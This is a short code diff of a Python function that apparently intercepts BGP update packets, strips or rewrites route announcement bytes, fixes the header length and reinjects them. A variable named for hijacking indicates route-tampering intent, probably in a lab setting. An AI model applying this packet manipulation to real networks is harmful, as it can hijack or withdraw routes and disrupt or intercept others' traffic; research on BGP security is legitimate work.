@@ -213,14 +213,19 @@ def pkt_in(packet):
     
 def edit_packet(pkt):
     print("edit packet")
-    new_nlri = BGPNLRI_IPv4(prefix="10.150.1.0/24")
-    new_nlri_bytes = bytes(new_nlri)
-    b_pkt = bytearray(bytes(pkt))
-    b_pkt[126:130] = new_nlri_bytes
-    pkt_reconstructed = CookedLinux(bytes(b_pkt))
+    p_hijack_bytes = bytearray(bytes(pkt))
+    del p_hijack_bytes[126:131]
+    pkt_reconstructed = CookedLinux(bytes(p_hijack_bytes))
+    pkt_reconstructed[BGPHeader].len = pkt_reconstructed[BGPHeader].len - 5
+    pkt_reconstructed.show2()
+    # new_nlri = BGPNLRI_IPv4(prefix="10.150.1.0/24")
+    # new_nlri_bytes = bytes(new_nlri)
+    # b_pkt = bytearray(bytes(pkt))
+    # b_pkt[126:130] = new_nlri_bytes
+    # pkt_reconstructed = CookedLinux(bytes(b_pkt))
     # del pkt_reconstructed[IP].chksum
     # del pkt_reconstructed[TCP].chksum 
-    pkt_reconstructed.show2()
+    # pkt_reconstructed.show2()
     print("new pkt nlri: " + str(pkt_reconstructed[BGPUpdate].nlri[0].prefix))
     return pkt_reconstructed
 
